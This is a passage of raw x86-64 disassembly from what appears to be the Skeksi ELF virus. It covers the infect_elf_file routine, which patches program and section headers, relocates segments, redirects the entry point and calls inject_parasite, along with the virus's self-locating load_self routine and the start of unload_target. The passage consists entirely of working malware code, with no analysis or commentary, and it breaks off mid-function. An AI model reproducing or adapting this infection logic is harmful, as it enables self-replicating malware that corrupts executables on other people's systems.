  400891:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400898:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  40089c:	48 89 45 d8          	mov    QWORD PTR [rbp-0x28],rax
  4008a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4008a4:	48 25 00 f0 ff ff    	and    rax,0xfffffffffffff000
  4008aa:	48 05 00 10 00 00    	add    rax,0x1000
  4008b0:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4008b4:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008bb:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  4008bf:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4008c3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4008c7:	48 83 c0 09          	add    rax,0x9
  4008cb:	c7 00 25 5d 01 00    	mov    DWORD PTR [rax],0x15d25
  4008d1:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008d8:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4008db:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  4008df:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008e6:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  4008ea:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  4008ee:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  4008f5:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  4008f9:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  4008fd:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400901:	48 8b 40 18          	mov    rax,QWORD PTR [rax+0x18]
  400905:	48 89 45 a8          	mov    QWORD PTR [rbp-0x58],rax
  400909:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40090d:	48 8b 50 08          	mov    rdx,QWORD PTR [rax+0x8]
  400911:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400915:	48 01 c2             	add    rdx,rax
  400918:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40091c:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  400920:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400924:	48 83 c0 38          	add    rax,0x38
  400928:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  40092c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400930:	48 83 c0 38          	add    rax,0x38
  400934:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400938:	48 01 ca             	add    rdx,rcx
  40093b:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40093f:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400946:	e9 ec 02 00 00       	jmp    400c37 <infect_elf_file+0x3d9>
  40094b:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  40094f:	74 4b                	je     40099c <infect_elf_file+0x13e>
  400951:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400954:	48 63 d0             	movsxd rdx,eax
  400957:	48 89 d0             	mov    rax,rdx
  40095a:	48 c1 e0 03          	shl    rax,0x3
  40095e:	48 29 d0             	sub    rax,rdx
  400961:	48 c1 e0 03          	shl    rax,0x3
  400965:	48 89 c2             	mov    rdx,rax
  400968:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40096c:	48 01 d0             	add    rax,rdx
  40096f:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
  400973:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400976:	48 63 d0             	movsxd rdx,eax
  400979:	48 89 d0             	mov    rax,rdx
  40097c:	48 c1 e0 03          	shl    rax,0x3
  400980:	48 29 d0             	sub    rax,rdx
  400983:	48 c1 e0 03          	shl    rax,0x3
  400987:	48 89 c2             	mov    rdx,rax
  40098a:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  40098e:	48 01 d0             	add    rax,rdx
  400991:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400995:	48 01 ca             	add    rdx,rcx
  400998:	48 89 50 08          	mov    QWORD PTR [rax+0x8],rdx
  40099c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40099f:	48 63 d0             	movsxd rdx,eax
  4009a2:	48 89 d0             	mov    rax,rdx
  4009a5:	48 c1 e0 03          	shl    rax,0x3
  4009a9:	48 29 d0             	sub    rax,rdx
  4009ac:	48 c1 e0 03          	shl    rax,0x3
  4009b0:	48 89 c2             	mov    rdx,rax
  4009b3:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009b7:	48 01 d0             	add    rax,rdx
  4009ba:	8b 00                	mov    eax,DWORD PTR [rax]
  4009bc:	83 f8 01             	cmp    eax,0x1
  4009bf:	0f 85 d4 01 00 00    	jne    400b99 <infect_elf_file+0x33b>
  4009c5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009c8:	48 63 d0             	movsxd rdx,eax
  4009cb:	48 89 d0             	mov    rax,rdx
  4009ce:	48 c1 e0 03          	shl    rax,0x3
  4009d2:	48 29 d0             	sub    rax,rdx
  4009d5:	48 c1 e0 03          	shl    rax,0x3
  4009d9:	48 89 c2             	mov    rdx,rax
  4009dc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  4009e0:	48 01 d0             	add    rax,rdx
  4009e3:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  4009e6:	83 f8 05             	cmp    eax,0x5
  4009e9:	0f 85 aa 01 00 00    	jne    400b99 <infect_elf_file+0x33b>
  4009ef:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  4009f2:	48 63 d0             	movsxd rdx,eax
  4009f5:	48 89 d0             	mov    rax,rdx
  4009f8:	48 c1 e0 03          	shl    rax,0x3
  4009fc:	48 29 d0             	sub    rax,rdx
  4009ff:	48 c1 e0 03          	shl    rax,0x3
  400a03:	48 89 c2             	mov    rdx,rax
  400a06:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a0a:	48 01 d0             	add    rax,rdx
  400a0d:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400a11:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400a15:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a18:	48 63 d0             	movsxd rdx,eax
  400a1b:	48 89 d0             	mov    rax,rdx
  400a1e:	48 c1 e0 03          	shl    rax,0x3
  400a22:	48 29 d0             	sub    rax,rdx
  400a25:	48 c1 e0 03          	shl    rax,0x3
  400a29:	48 89 c2             	mov    rdx,rax
  400a2c:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a30:	48 01 d0             	add    rax,rdx
  400a33:	48 8b 48 10          	mov    rcx,QWORD PTR [rax+0x10]
  400a37:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a3a:	48 63 d0             	movsxd rdx,eax
  400a3d:	48 89 d0             	mov    rax,rdx
  400a40:	48 c1 e0 03          	shl    rax,0x3
  400a44:	48 29 d0             	sub    rax,rdx
  400a47:	48 c1 e0 03          	shl    rax,0x3
  400a4b:	48 89 c2             	mov    rdx,rax
  400a4e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a52:	48 01 c2             	add    rdx,rax
  400a55:	48 89 c8             	mov    rax,rcx
  400a58:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400a5c:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400a60:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a63:	48 63 d0             	movsxd rdx,eax
  400a66:	48 89 d0             	mov    rax,rdx
  400a69:	48 c1 e0 03          	shl    rax,0x3
  400a6d:	48 29 d0             	sub    rax,rdx
  400a70:	48 c1 e0 03          	shl    rax,0x3
  400a74:	48 89 c2             	mov    rdx,rax
  400a77:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a7b:	48 01 d0             	add    rax,rdx
  400a7e:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400a82:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400a85:	48 63 d0             	movsxd rdx,eax
  400a88:	48 89 d0             	mov    rax,rdx
  400a8b:	48 c1 e0 03          	shl    rax,0x3
  400a8f:	48 29 d0             	sub    rax,rdx
  400a92:	48 c1 e0 03          	shl    rax,0x3
  400a96:	48 89 c2             	mov    rdx,rax
  400a99:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400a9d:	48 01 c2             	add    rdx,rax
  400aa0:	48 89 c8             	mov    rax,rcx
  400aa3:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400aa7:	48 89 42 18          	mov    QWORD PTR [rdx+0x18],rax
  400aab:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400aae:	48 63 d0             	movsxd rdx,eax
  400ab1:	48 89 d0             	mov    rax,rdx
  400ab4:	48 c1 e0 03          	shl    rax,0x3
  400ab8:	48 29 d0             	sub    rax,rdx
  400abb:	48 c1 e0 03          	shl    rax,0x3
  400abf:	48 89 c2             	mov    rdx,rax
  400ac2:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ac6:	48 01 d0             	add    rax,rdx
  400ac9:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400acd:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400ad0:	48 63 d0             	movsxd rdx,eax
  400ad3:	48 89 d0             	mov    rax,rdx
  400ad6:	48 c1 e0 03          	shl    rax,0x3
  400ada:	48 29 d0             	sub    rax,rdx
  400add:	48 c1 e0 03          	shl    rax,0x3
  400ae1:	48 89 c2             	mov    rdx,rax
  400ae4:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400ae8:	48 01 d0             	add    rax,rdx
  400aeb:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400aef:	48 01 ca             	add    rdx,rcx
  400af2:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400af6:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400af9:	48 63 d0             	movsxd rdx,eax
  400afc:	48 89 d0             	mov    rax,rdx
  400aff:	48 c1 e0 03          	shl    rax,0x3
  400b03:	48 29 d0             	sub    rax,rdx
  400b06:	48 c1 e0 03          	shl    rax,0x3
  400b0a:	48 89 c2             	mov    rdx,rax
  400b0d:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b11:	48 01 d0             	add    rax,rdx
  400b14:	48 8b 48 28          	mov    rcx,QWORD PTR [rax+0x28]
  400b18:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b1b:	48 63 d0             	movsxd rdx,eax
  400b1e:	48 89 d0             	mov    rax,rdx
  400b21:	48 c1 e0 03          	shl    rax,0x3
  400b25:	48 29 d0             	sub    rax,rdx
  400b28:	48 c1 e0 03          	shl    rax,0x3
  400b2c:	48 89 c2             	mov    rdx,rax
  400b2f:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b33:	48 01 d0             	add    rax,rdx
  400b36:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400b3a:	48 01 ca             	add    rdx,rcx
  400b3d:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400b41:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b44:	48 63 d0             	movsxd rdx,eax
  400b47:	48 89 d0             	mov    rax,rdx
  400b4a:	48 c1 e0 03          	shl    rax,0x3
  400b4e:	48 29 d0             	sub    rax,rdx
  400b51:	48 c1 e0 03          	shl    rax,0x3
  400b55:	48 89 c2             	mov    rdx,rax
  400b58:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b5c:	48 01 d0             	add    rax,rdx
  400b5f:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400b66:	00 
  400b67:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b6a:	48 63 d0             	movsxd rdx,eax
  400b6d:	48 89 d0             	mov    rax,rdx
  400b70:	48 c1 e0 03          	shl    rax,0x3
  400b74:	48 29 d0             	sub    rax,rdx
  400b77:	48 c1 e0 03          	shl    rax,0x3
  400b7b:	48 89 c2             	mov    rdx,rax
  400b7e:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400b82:	48 01 d0             	add    rax,rdx
  400b85:	48 8b 40 10          	mov    rax,QWORD PTR [rax+0x10]
  400b89:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400b8d:	c7 45 fc 01 00 00 00 	mov    DWORD PTR [rbp-0x4],0x1
  400b94:	e9 9a 00 00 00       	jmp    400c33 <infect_elf_file+0x3d5>
  400b99:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400b9c:	48 63 d0             	movsxd rdx,eax
  400b9f:	48 89 d0             	mov    rax,rdx
  400ba2:	48 c1 e0 03          	shl    rax,0x3
  400ba6:	48 29 d0             	sub    rax,rdx
  400ba9:	48 c1 e0 03          	shl    rax,0x3
  400bad:	48 89 c2             	mov    rdx,rax
  400bb0:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bb4:	48 01 d0             	add    rax,rdx
  400bb7:	8b 00                	mov    eax,DWORD PTR [rax]
  400bb9:	83 f8 01             	cmp    eax,0x1
  400bbc:	75 75                	jne    400c33 <infect_elf_file+0x3d5>
  400bbe:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400bc1:	48 63 d0             	movsxd rdx,eax
  400bc4:	48 89 d0             	mov    rax,rdx
  400bc7:	48 c1 e0 03          	shl    rax,0x3
  400bcb:	48 29 d0             	sub    rax,rdx
  400bce:	48 c1 e0 03          	shl    rax,0x3
  400bd2:	48 89 c2             	mov    rdx,rax
  400bd5:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400bd9:	48 01 d0             	add    rax,rdx
  400bdc:	48 8b 40 08          	mov    rax,QWORD PTR [rax+0x8]
  400be0:	48 85 c0             	test   rax,rax
  400be3:	74 4e                	je     400c33 <infect_elf_file+0x3d5>
  400be5:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400be8:	48 63 d0             	movsxd rdx,eax
  400beb:	48 89 d0             	mov    rax,rdx
  400bee:	48 c1 e0 03          	shl    rax,0x3
  400bf2:	48 29 d0             	sub    rax,rdx
  400bf5:	48 c1 e0 03          	shl    rax,0x3
  400bf9:	48 89 c2             	mov    rdx,rax
  400bfc:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c00:	48 01 d0             	add    rax,rdx
  400c03:	8b 40 04             	mov    eax,DWORD PTR [rax+0x4]
  400c06:	83 e0 02             	and    eax,0x2
  400c09:	85 c0                	test   eax,eax
  400c0b:	74 26                	je     400c33 <infect_elf_file+0x3d5>
  400c0d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400c10:	48 63 d0             	movsxd rdx,eax
  400c13:	48 89 d0             	mov    rax,rdx
  400c16:	48 c1 e0 03          	shl    rax,0x3
  400c1a:	48 29 d0             	sub    rax,rdx
  400c1d:	48 c1 e0 03          	shl    rax,0x3
  400c21:	48 89 c2             	mov    rdx,rax
  400c24:	48 8b 45 b8          	mov    rax,QWORD PTR [rbp-0x48]
  400c28:	48 01 d0             	add    rax,rdx
  400c2b:	48 c7 40 30 00 10 00 	mov    QWORD PTR [rax+0x30],0x1000
  400c32:	00 
  400c33:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400c37:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c3b:	0f b7 40 38          	movzx  eax,WORD PTR [rax+0x38]
  400c3f:	0f b7 c0             	movzx  eax,ax
  400c42:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400c45:	0f 8c 00 fd ff ff    	jl     40094b <infect_elf_file+0xed>
  400c4b:	83 7d fc 00          	cmp    DWORD PTR [rbp-0x4],0x0
  400c4f:	75 0c                	jne    400c5d <infect_elf_file+0x3ff>
  400c51:	48 c7 c0 ff ff ff ff 	mov    rax,0xffffffffffffffff
  400c58:	e9 e3 01 00 00       	jmp    400e40 <infect_elf_file+0x5e2>
  400c5d:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400c61:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400c65:	48 8d 50 40          	lea    rdx,[rax+0x40]
  400c69:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c6d:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400c71:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c75:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400c79:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400c7d:	48 01 d0             	add    rax,rdx
  400c80:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  400c84:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400c88:	0f b7 40 3e          	movzx  eax,WORD PTR [rax+0x3e]
  400c8c:	0f b7 c0             	movzx  eax,ax
  400c8f:	48 c1 e0 06          	shl    rax,0x6
  400c93:	48 89 c2             	mov    rdx,rax
  400c96:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400c9a:	48 01 d0             	add    rax,rdx
  400c9d:	48 8b 50 18          	mov    rdx,QWORD PTR [rax+0x18]
  400ca1:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  400ca5:	48 01 d0             	add    rax,rdx
  400ca8:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  400cac:	c7 45 f8 00 00 00 00 	mov    DWORD PTR [rbp-0x8],0x0
  400cb3:	e9 1d 01 00 00       	jmp    400dd5 <infect_elf_file+0x577>
  400cb8:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cbb:	48 98                	cdqe   
  400cbd:	48 c1 e0 06          	shl    rax,0x6
  400cc1:	48 89 c2             	mov    rdx,rax
  400cc4:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400cc8:	48 01 d0             	add    rax,rdx
  400ccb:	8b 00                	mov    eax,DWORD PTR [rax]
  400ccd:	89 c2                	mov    edx,eax
  400ccf:	48 8b 45 a0          	mov    rax,QWORD PTR [rbp-0x60]
  400cd3:	48 01 d0             	add    rax,rdx
  400cd6:	ba 05 00 00 00       	mov    edx,0x5
  400cdb:	48 8d 35 e0 20 00 00 	lea    rsi,[rip+0x20e0]        # 402dc2 <display_skeksi+0x8f>
  400ce2:	48 89 c7             	mov    rdi,rax
  400ce5:	e8 dd 1e 00 00       	call   402bc7 <_strncmp>
  400cea:	85 c0                	test   eax,eax
  400cec:	0f 85 aa 00 00 00    	jne    400d9c <infect_elf_file+0x53e>
  400cf2:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400cf5:	48 98                	cdqe   
  400cf7:	48 c1 e0 06          	shl    rax,0x6
  400cfb:	48 89 c2             	mov    rdx,rax
  400cfe:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d02:	48 01 d0             	add    rax,rdx
  400d05:	48 c7 40 18 40 00 00 	mov    QWORD PTR [rax+0x18],0x40
  400d0c:	00 
  400d0d:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d10:	48 98                	cdqe   
  400d12:	48 c1 e0 06          	shl    rax,0x6
  400d16:	48 89 c2             	mov    rdx,rax
  400d19:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d1d:	48 01 c2             	add    rdx,rax
  400d20:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400d24:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  400d28:	48 89 42 10          	mov    QWORD PTR [rdx+0x10],rax
  400d2c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d2f:	48 98                	cdqe   
  400d31:	48 c1 e0 06          	shl    rax,0x6
  400d35:	48 89 c2             	mov    rdx,rax
  400d38:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d3c:	48 01 d0             	add    rax,rdx
  400d3f:	48 8b 50 10          	mov    rdx,QWORD PTR [rax+0x10]
  400d43:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d46:	48 98                	cdqe   
  400d48:	48 c1 e0 06          	shl    rax,0x6
  400d4c:	48 89 c1             	mov    rcx,rax
  400d4f:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d53:	48 01 c8             	add    rax,rcx
  400d56:	48 83 c2 40          	add    rdx,0x40
  400d5a:	48 89 50 10          	mov    QWORD PTR [rax+0x10],rdx
  400d5e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d61:	48 98                	cdqe   
  400d63:	48 c1 e0 06          	shl    rax,0x6
  400d67:	48 89 c2             	mov    rdx,rax
  400d6a:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d6e:	48 01 d0             	add    rax,rdx
  400d71:	48 8b 48 20          	mov    rcx,QWORD PTR [rax+0x20]
  400d75:	48 8b 85 08 ff ff ff 	mov    rax,QWORD PTR [rbp-0xf8]
  400d7c:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400d80:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d83:	48 98                	cdqe   
  400d85:	48 c1 e0 06          	shl    rax,0x6
  400d89:	48 89 c6             	mov    rsi,rax
  400d8c:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400d90:	48 01 f0             	add    rax,rsi
  400d93:	48 01 ca             	add    rdx,rcx
  400d96:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400d9a:	eb 35                	jmp    400dd1 <infect_elf_file+0x573>
  400d9c:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400d9f:	48 98                	cdqe   
  400da1:	48 c1 e0 06          	shl    rax,0x6
  400da5:	48 89 c2             	mov    rdx,rax
  400da8:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400dac:	48 01 d0             	add    rax,rdx
  400daf:	48 8b 48 18          	mov    rcx,QWORD PTR [rax+0x18]
  400db3:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400db6:	48 98                	cdqe   
  400db8:	48 c1 e0 06          	shl    rax,0x6
  400dbc:	48 89 c2             	mov    rdx,rax
  400dbf:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  400dc3:	48 01 d0             	add    rax,rdx
  400dc6:	48 8b 55 d0          	mov    rdx,QWORD PTR [rbp-0x30]
  400dca:	48 01 ca             	add    rdx,rcx
  400dcd:	48 89 50 18          	mov    QWORD PTR [rax+0x18],rdx
  400dd1:	83 45 f8 01          	add    DWORD PTR [rbp-0x8],0x1
  400dd5:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400dd9:	0f b7 40 3c          	movzx  eax,WORD PTR [rax+0x3c]
  400ddd:	0f b7 c0             	movzx  eax,ax
  400de0:	39 45 f8             	cmp    DWORD PTR [rbp-0x8],eax
  400de3:	0f 8c cf fe ff ff    	jl     400cb8 <infect_elf_file+0x45a>
  400de9:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400ded:	48 8b 50 28          	mov    rdx,QWORD PTR [rax+0x28]
  400df1:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400df5:	48 01 c2             	add    rdx,rax
  400df8:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400dfc:	48 89 50 28          	mov    QWORD PTR [rax+0x28],rdx
  400e00:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e04:	48 8b 50 20          	mov    rdx,QWORD PTR [rax+0x20]
  400e08:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400e0c:	48 01 c2             	add    rdx,rax
  400e0f:	48 8b 45 c0          	mov    rax,QWORD PTR [rbp-0x40]
  400e13:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
  400e17:	48 8b 7d a8          	mov    rdi,QWORD PTR [rbp-0x58]
  400e1b:	48 8b 8d 08 ff ff ff 	mov    rcx,QWORD PTR [rbp-0xf8]
  400e22:	48 8b 95 00 ff ff ff 	mov    rdx,QWORD PTR [rbp-0x100]
  400e29:	48 8b 75 d0          	mov    rsi,QWORD PTR [rbp-0x30]
  400e2d:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400e31:	49 89 f8             	mov    r8,rdi
  400e34:	48 89 c7             	mov    rdi,rax
  400e37:	e8 84 f7 ff ff       	call   4005c0 <inject_parasite>
  400e3c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  400e40:	c9                   	leave  
  400e41:	c3                   	ret    

0000000000400e42 <load_self>:
  400e42:	f3 0f 1e fa          	endbr64 
  400e46:	55                   	push   rbp
  400e47:	48 89 e5             	mov    rbp,rsp
  400e4a:	48 83 ec 30          	sub    rsp,0x30
  400e4e:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400e52:	e8 a0 1e 00 00       	call   402cf7 <get_rip>
  400e57:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400e5e:	48 89 d1             	mov    rcx,rdx
  400e61:	48 c7 c2 12 2d 40 00 	mov    rdx,0x402d12
  400e68:	48 29 d1             	sub    rcx,rdx
  400e6b:	48 89 ca             	mov    rdx,rcx
  400e6e:	48 29 d0             	sub    rax,rdx
  400e71:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400e75:	e8 7d 1e 00 00       	call   402cf7 <get_rip>
  400e7a:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400e81:	48 89 d1             	mov    rcx,rdx
  400e84:	48 c7 c2 27 2d 40 00 	mov    rdx,0x402d27
  400e8b:	48 29 d1             	sub    rcx,rdx
  400e8e:	48 89 ca             	mov    rdx,rcx
  400e91:	48 29 d0             	sub    rax,rdx
  400e94:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  400e98:	e8 5a 1e 00 00       	call   402cf7 <get_rip>
  400e9d:	48 c7 c2 04 2d 40 00 	mov    rdx,0x402d04
  400ea4:	48 89 d1             	mov    rcx,rdx
  400ea7:	48 c7 c2 9c 01 40 00 	mov    rdx,0x40019c
  400eae:	48 29 d1             	sub    rcx,rdx
  400eb1:	48 89 ca             	mov    rdx,rcx
  400eb4:	48 29 d0             	sub    rax,rdx
  400eb7:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  400ebb:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400ebf:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400ec3:	48 89 50 50          	mov    QWORD PTR [rax+0x50],rdx
  400ec7:	48 c7 c0 12 2d 40 00 	mov    rax,0x402d12
  400ece:	48 89 c2             	mov    rdx,rax
  400ed1:	48 c7 c0 9c 01 40 00 	mov    rax,0x40019c
  400ed8:	48 29 c2             	sub    rdx,rax
  400edb:	48 89 d0             	mov    rax,rdx
  400ede:	48 89 c2             	mov    rdx,rax
  400ee1:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400ee5:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400ee9:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400eed:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400ef1:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400ef5:	48 2b 45 f8          	sub    rax,QWORD PTR [rbp-0x8]
  400ef9:	48 98                	cdqe   
  400efb:	48 01 c2             	add    rdx,rax
  400efe:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f02:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f06:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f0a:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400f0e:	48 8d 90 68 42 00 00 	lea    rdx,[rax+0x4268]
  400f15:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400f19:	48 89 50 58          	mov    QWORD PTR [rax+0x58],rdx
  400f1d:	b8 00 00 00 00       	mov    eax,0x0
  400f22:	c9                   	leave  
  400f23:	c3                   	ret    

0000000000400f24 <unload_target>:
  400f24:	f3 0f 1e fa          	endbr64 
  400f28:	55                   	push   rbp
  400f29:	48 89 e5             	mov    rbp,rsp
  400f2c:	48 83 ec 10          	sub    rsp,0x10
  400f30:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400f34:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f38:	48 8b 50 58          	mov    rdx,QWORD PTR [rax+0x58]
  400f3c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400f40:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  400f44:	48 89 d6             	mov    rsi,rdx
  400f47:	48 89 c7             	mov    rdi,rax
